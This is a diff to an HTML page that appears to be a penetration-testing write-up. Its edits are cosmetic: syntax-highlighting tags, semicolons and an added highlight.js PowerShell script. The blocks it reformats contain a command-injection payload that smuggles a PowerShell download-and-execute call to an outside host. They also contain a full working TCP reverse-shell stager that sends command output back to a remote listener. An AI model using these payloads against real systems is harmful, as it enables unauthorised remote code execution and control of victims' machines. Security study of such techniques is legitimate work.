@@ -248,24 +248,26 @@ response. Hosted a script and triggered download-execute via
 the same injection point:
 </p>
 
-<pre><code class="language-ps">|powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('https://thevillagehacker.com/mypowershell.ps1')"||</code></pre>
+<pre><code class="language-powershell">|powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('https://thevillagehacker.com/mypowershell.ps1')"||</code></pre>
 
 <p>
 Stager contents (TCP reverse shell pattern; adjust host/port
 per engagement):
 </p>
 
-<pre><code class="language-ps">$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10', 80);
-$stream = $client.GetStream();
-[byte[]]$bytes = 0..65535|%{0};
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
-    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
-    $sendback = (iex ". { $data } 2>&amp;1" | Out-String);
-    $sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';
-    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-    $stream.Write($sendbyte, 0, $sendbyte.Length);
+<pre><code class="language-powershell">$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10', 80)
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535 | %{ 0 }
+
+while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
+    $sendback = (iex ". { $data } 2&gt;&amp;1" | Out-String)
+    $sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; '
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+    $stream.Write($sendbyte, 0, $sendbyte.Length)
     $stream.Flush()
-};
+}
+
 $client.Close()</code></pre>
 
 <p>
@@ -358,6 +360,7 @@ tell the truth.
 </div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/powershell.min.js"></script>
 
 <script>
 hljs.highlightAll();
